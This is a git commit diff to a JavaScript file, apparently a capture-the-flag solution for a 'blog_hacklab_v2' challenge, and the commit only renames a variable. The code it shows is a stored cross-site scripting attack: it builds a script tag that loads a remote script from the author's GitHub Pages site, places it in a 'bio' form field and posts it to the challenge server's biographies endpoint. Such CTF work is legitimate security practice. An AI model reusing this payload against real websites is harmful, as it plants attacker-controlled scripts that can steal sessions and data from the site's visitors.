ad7962c5eb05ecc4ff3680bc42442a72d8500bbe
Matias Lima <matiaselima@hotmail.com>
2026-09-25 00:56:45 -0300

    aksdjh

--- blog_hacklab_v2/pepe.js
+++ blog_hacklab_v2/pepe.js
@@ -2,9 +2,9 @@
 
   var formData = new FormData();
 
-  const payload = "<script src='https:/" + "/matiaselima.github.io/ctf/blog_hacklab_v2/jeni.js'></script>";
+  const carga = "<script src='https:/" + "/matiaselima.github.io/ctf/blog_hacklab_v2/jeni.js'></script>";
   
-  formData.append("bio", payload); 
+  formData.append("bio", carga); 
   formData.append("profile_pic", new Blob([""]), "");
 
   fetch('https://chl-ccdde8bd-d1b4-4896-99af-e358dc89319d-blog-hacklab-v2.softwareseguro.com.ar/biographies', {
